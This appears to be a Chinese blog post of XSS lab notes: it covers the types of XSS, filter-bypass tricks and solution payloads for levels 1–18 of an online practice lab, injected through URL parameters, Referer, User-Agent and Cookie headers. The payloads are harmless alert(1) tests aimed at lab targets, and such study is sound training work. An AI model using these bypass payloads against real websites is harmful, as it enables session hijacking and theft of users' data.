@@ -1,0 +1,767 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>xss靶场刷题笔记 | GetFlag&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="GetFlag">
+    
+
+    
+    <meta name="description" content="基础分类反射型xss 发出带xss攻击代码的请求，作为输入提交到服务端，服务端响应后，在响应内容中出现xss攻击代码，最终被浏览器执行，整个过程像一次反射。 存储型xss 提交的xss攻击代码，会被存储的服务端，下次请求该页面时会被显示出来。 DOM型xss 攻击者提交的攻击代码并未显式的包含在web服务器的响应页面中，但会被页面中的js脚本以变量的形式来访问到，导致浏览器在渲染页面执行js脚本的">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss靶场刷题笔记">
+<meta property="og:url" content="http://flag0.com/2019/09/17/xss靶场刷题笔记/index.html">
+<meta property="og:site_name" content="GetFlag&#39;s Blog">
+<meta property="og:description" content="基础分类反射型xss 发出带xss攻击代码的请求，作为输入提交到服务端，服务端响应后，在响应内容中出现xss攻击代码，最终被浏览器执行，整个过程像一次反射。 存储型xss 提交的xss攻击代码，会被存储的服务端，下次请求该页面时会被显示出来。 DOM型xss 攻击者提交的攻击代码并未显式的包含在web服务器的响应页面中，但会被页面中的js脚本以变量的形式来访问到，导致浏览器在渲染页面执行js脚本的">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:image" content="http://flag0.com/img/images/xss/ct_htmltree.gif">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566117473054.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566117677124.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566117843466.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566118167891.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566119933512.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566120096043.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1674381-20190509092441098-104348677.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566120780263.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565975597010.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565975713481.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565976025763.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565976222115.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1674381-20190509092441098-104348677.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565976866652.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565977611808.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565977891890.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1565978443744.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566051465488.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566054291970.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566054976762.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566099624740.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100473766.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100249389.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100354668.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100559561.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100711721.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566100741365.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566103666562.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566110661611.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566110784733.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111505736.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111515187.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111714753.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111680101.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111921044.png">
+<meta property="og:image" content="http://flag0.com/img/images/xss/1566111956810.png">
+<meta property="og:updated_time" content="2019-09-17T10:55:41.664Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss靶场刷题笔记">
+<meta name="twitter:description" content="基础分类反射型xss 发出带xss攻击代码的请求，作为输入提交到服务端，服务端响应后，在响应内容中出现xss攻击代码，最终被浏览器执行，整个过程像一次反射。 存储型xss 提交的xss攻击代码，会被存储的服务端，下次请求该页面时会被显示出来。 DOM型xss 攻击者提交的攻击代码并未显式的包含在web服务器的响应页面中，但会被页面中的js脚本以变量的形式来访问到，导致浏览器在渲染页面执行js脚本的">
+<meta name="twitter:image" content="http://flag0.com/img/images/xss/ct_htmltree.gif">
+
+    
+    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/09/17/xss靶场刷题笔记/" title="xss靶场刷题笔记" itemprop="url">xss靶场刷题笔记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2019-09-17T10:55:41.000Z" itemprop="datePublished"> Published 2019-09-17</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分类"><span class="toc-number">1.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#危害"><span class="toc-number">1.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于JavaScript"><span class="toc-number">1.3.</span> <span class="toc-text">关于JavaScript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html与js基础"><span class="toc-number">1.4.</span> <span class="toc-text">html与js基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#触发场景"><span class="toc-number">1.5.</span> <span class="toc-text">触发场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见绕过"><span class="toc-number">1.6.</span> <span class="toc-text">常见绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶场"><span class="toc-number">2.</span> <span class="toc-text">靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#level1"><span class="toc-number">2.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level2"><span class="toc-number">2.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level3"><span class="toc-number">2.3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level4"><span class="toc-number">2.4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leve5"><span class="toc-number">2.5.</span> <span class="toc-text">leve5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level6"><span class="toc-number">2.6.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level7"><span class="toc-number">2.7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level8"><span class="toc-number">2.8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level9"><span class="toc-number">2.9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level10"><span class="toc-number">2.10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level11"><span class="toc-number">2.11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level12"><span class="toc-number">2.12.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level13"><span class="toc-number">2.13.</span> <span class="toc-text">level13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level14"><span class="toc-number">2.14.</span> <span class="toc-text">level14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level15"><span class="toc-number">2.15.</span> <span class="toc-text">level15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level16"><span class="toc-number">2.16.</span> <span class="toc-text">level16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level17"><span class="toc-number">2.17.</span> <span class="toc-text">level17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level18"><span class="toc-number">2.18.</span> <span class="toc-text">level18</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p><strong>反射型xss</strong></p>
+<p>发出带xss攻击代码的请求，作为输入提交到服务端，服务端响应后，在响应内容中出现xss攻击代码，最终被浏览器执行，整个过程像一次反射。</p>
+<p><strong>存储型xss</strong></p>
+<p>提交的xss攻击代码，会被存储的服务端，下次请求该页面时会被显示出来。</p>
+<p><strong>DOM型xss</strong></p>
+<p>攻击者提交的攻击代码并未显式的包含在web服务器的响应页面中，但会被页面中的js脚本以变量的形式来访问到，导致浏览器在渲染页面执行js脚本的过程中，通过DOM操作执行变量所代表的恶意脚本。</p>
+<a id="more"></a>
+<p><img src="\img\images\xss\ct_htmltree.gif" alt="HTML DOM Node Tree"></p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>钓鱼，获取用户账号，密码</li>
+<li>盗取cookie</li>
+<li>劫持会话，执行任意操作(改密码、留言等CSRF)</li>
+<li>强制弹出广告页面，刷广告流量</li>
+<li>网页挂马、挖矿</li>
+<li>ddos攻击</li>
+</ul>
+<h4 id="关于JavaScript"><a href="#关于JavaScript" class="headerlink" title="关于JavaScript"></a>关于JavaScript</h4><ul>
+<li>JavaScript是一种客户端的脚本语言，是运行的浏览器中的</li>
+<li>浏览器会自动运行网页中的JavaScript代码，并且JavaScript代码对于用户来说是透明的</li>
+<li>网页中运行JavaScript的方式<ul>
+<li>引入外部js </li>
+</ul>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>使用超链接(javascript伪协议)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert(111)"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<script></script>标签</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用事件方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>网页可以通过事件与用户进行交互</p>
+</li>
+<li><p>浏览器中可以选择禁用JavaScript代码</p>
+</li>
+</ul>
+<h4 id="html与js基础"><a href="#html与js基础" class="headerlink" title="html与js基础"></a>html与js基础</h4><p><strong>1.在超链接执行js代码</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>javascript //js伪协议</li>
+</ul>
+<p><strong>2.通过事件属性执行js代码(通过属性事件执行时，可以加引号，也可以不加引号)</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> onclick=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>常见事件</p>
+<table>
+<thead>
+<tr>
+<th>事件名称</th>
+<th>类型</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>onerror</td>
+<td>Window 事件属性</td>
+<td>在错误发生时运行的脚本。</td>
+</tr>
+<tr>
+<td>onload</td>
+<td>Window 事件属性</td>
+<td>页面加载结束以后运行脚本</td>
+</tr>
+<tr>
+<td>onclick</td>
+<td>Mouse 事件</td>
+<td>元素上发生鼠标点击时触发。</td>
+</tr>
+<tr>
+<td>onmouseover</td>
+<td>Mouse 事件</td>
+<td>当鼠标指针移动到元素上时触发。</td>
+</tr>
+<tr>
+<td>oninput</td>
+<td>From事件</td>
+<td>当元素获得用户输入时运行的脚本。</td>
+</tr>
+</tbody>
+</table>
+<p><a href="\img\images\https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">全部事件</a></p>
+<h4 id="触发场景"><a href="#触发场景" class="headerlink" title="触发场景"></a>触发场景</h4><p><strong>1.在标签中的xss</strong></p>
+<p>level1</p>
+<p><img src="\img\images\xss\1566117473054.png" alt="1566117473054"></p>
+<p>输入被放在h2标签中，可以确定此处存在xss漏洞，通过观察，判断是否需要闭合标签，以便成功触发xss漏洞</p>
+<p><strong>2.在属性中的xss</strong></p>
+<p><img src="\img\images\xss\1566117677124.png" alt="1566117677124"></p>
+<p>我们的输入在”input”标签的属性中，如果直接构造我们的payload无法顺利执行其中的代码，所以我们先进行标签或者引号的闭合，再注入我们的代码</p>
+<p><strong>3.选择列表中的xss</strong></p>
+<p>在选择列表中，不闭合option标签一样可以触发xss</p>
+<p><img src="\img\images\xss\1566117843466.png" alt="1566117843466"></p>
+<h4 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h4><p><strong>html实体编码(uncode编码) 绕过黑名单</strong>（hackbar需要手动url编码，否则echo无法输出）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$name = strtolower($name);</span><br><span class="line">$name = str_replace(<span class="string">"t"</span>,<span class="string">"_t"</span>,$name);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$name.<span class="string">"&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤效果</p>
+<p><img src="\img\images\xss\1566118167891.png" alt="1566118167891"></p>
+<p>绕过方式</p>
+<p>html实体编码(通过a标签href访问可以执行)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/info.php?name=&lt;a href=&quot;javascrip&amp;#116;:aler&amp;#116;(1)&quot;&gt;a&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566119933512.png" alt="1566119933512"></p>
+<p><strong>绕过htmlspecialchars</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=# method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=name  value="'</span>.htmlspecialchars($name).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$name.<span class="string">'"&gt;aaa&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试输入</p>
+<p><img src="\img\images\xss\1566120096043.png" alt="1566120096043"></p>
+<p>发现对其进行了html实体编码</p>
+<p><img src="\img\images\xss\1674381-20190509092441098-104348677.png" alt="img"></p>
+<p>html函数对与<code>&amp; &quot;  &#39; &lt; &gt;</code>进行实体编码</p>
+<p>结合实际情况绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566120780263.png" alt="1566120780263"></p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p><a href="\img\images\http://xss.tesla-space.com/?tdsourcetag=s_pcqq_aiomsg">靶场在线地址</a></p>
+<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565975597010.png" alt="1565975597010"></p>
+<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>闭合掉输入框</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.tesla-space.com/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565975713481.png" alt="1565975713481"></p>
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>采用了实体编码<code>htmlspecialchars</code></p>
+<p><img src="\img\images\xss\1565976025763.png" alt="1565976025763"></p>
+<p>常规绕过不好用，因此我们可以使用不带有尖括号的特殊字符进行尝试：</p>
+<p>onmouseover:鼠标指针移动到元素上触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onmouseover = &apos;javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565976222115.png" alt="1565976222115"></p>
+<p><img src="\img\images\xss\1674381-20190509092441098-104348677.png" alt="img"></p>
+<p>如果换成<em>“ onmouseover=” javascript:alert(1)</em> ,却并不会成功<br>这是因为，<code>&lt;input type=&#39;text&#39; value=&#39; &amp;#039 onmouseover=&amp;#039 javascript:alert(1)&#39;&gt;</code><br>只有使用单引号，转换出来的&amp;#039才有意义</p>
+<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.tesla-space.com/level3.php?keyword=&apos;onmouseover=&apos;javascript:alert(1)&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565976866652.png" alt="1565976866652"></p>
+<h4 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h4><p>尝试oninput，发现过滤了on</p>
+<p>采用其他方法绕过，尝试&lt;&gt; 发现未进行实体编码</p>
+<p>采用超链接版本的xss代码绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/&gt; &lt;a href="</span>javascript:alet(<span class="number">1</span>)<span class="string">"/&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565977611808.png" alt="1565977611808"></p>
+<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>大小写绕过 href</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt; &lt;a Href="</span>javascript：alert(<span class="number">1</span>)<span class="string">" /&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565977891890.png" alt="1565977891890"></p>
+<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><p>str_replace 过滤关键字，采用双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.tesla-space.com/level7.php?keyword=&quot;/&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scscriptript&gt;//&lt;&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1565978443744.png" alt="1565978443744"></p>
+<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>
+<p>dom型xss（需要urlencode）</p>
+<p><strong>尝试对javascript这个函数的关键部分进行编码操作，无论是16进制编码还是Unicode编码均可以</strong></p>
+<p><img src="\img\images\xss\1566051465488.png" alt="1566051465488"></p>
+<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>％0d％0a 会被转义为回车</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;ipt:%0dhttp://www.test.com%0dalert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566054291970.png" alt="1566054291970"></p>
+<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>过滤了尖括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.tesla-space.com/level10.php?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566054976762.png" alt="1566054976762"></p>
+<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>代码审计，在referer里面添加payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: aaaa&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566099624740.png" alt="1566099624740"></p>
+<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>审计代码，发现由<code>User-Agent</code>接收并传递参数</p>
+<p><img src="\img\images\xss\1566100473766.png" alt="1566100473766"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566100249389.png" alt="1566100249389"></p>
+<p><img src="\img\images\xss\1566100354668.png" alt="1566100354668"></p>
+<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>审计代码发现其在cookie处用user函数传递</p>
+<p><img src="\img\images\xss\1566100559561.png" alt="1566100559561"></p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566100711721.png" alt="1566100711721"></p>
+<p><img src="\img\images\xss\1566100741365.png" alt="1566100741365"></p>
+<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>exif xss 使用exiftool   伪造信息即可，但因网站打不开所以滞后练习</p>
+<h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h4><p>文件包含</p>
+<p>审计代码发现只有一个src变量是可以控制的</p>
+<p><img src="\img\images\xss\1566103666562.png" alt="1566103666562"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-include</span>=<span class="string">"'myFile.htm'"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>//此为AngularJS包含html文件</span><br></pre></td></tr></table></figure>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>包含level1内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level15.php?src=&apos;level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span><br><span class="line">//这里的src加&apos;&apos;是因为需要ng-include格式</span><br><span class="line">//ng-incldue:&apos;xxx.html&apos;</span><br><span class="line">//方能执行</span><br></pre></td></tr></table></figure>
+<p>发现并没有效果。。。</p>
+<p>这里的ng-include </p>
+<p>属于angular js，需要调用angular.min.js文件，不调用不能正常执行功能，测试下发现源码里用的是google的被墙了，所以改为新的</p>
+<p><img src="\img\images\xss\1566110661611.png" alt="1566110661611"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</span><br></pre></td></tr></table></figure>
+<p>再次尝试payload</p>
+<p><img src="\img\images\xss\1566110784733.png" alt="1566110784733"></p>
+<h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h4><p>查看源代码发现这里过滤了<code>script、/、与空格</code></p>
+<p><img src="\img\images\xss\1566111505736.png" alt="1566111505736"></p>
+<p>构造payload(采用%0a绕过空格过滤)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566111515187.png" alt="1566111515187"></p>
+<h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>查看代码</p>
+<p><img src="\img\images\xss\1566111714753.png" alt="1566111714753"></p>
+<p>这里是使用了html实体编码来过滤尖括号和双引号</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level17.php?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\xss\1566111680101.png" alt="1566111680101"></p>
+<h4 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h4><p>过滤函数几乎没有区别</p>
+<p><img src="\img\images\xss\1566111921044.png" alt="1566111921044"></p>
+<p>采用同样的payload绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level18.php?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
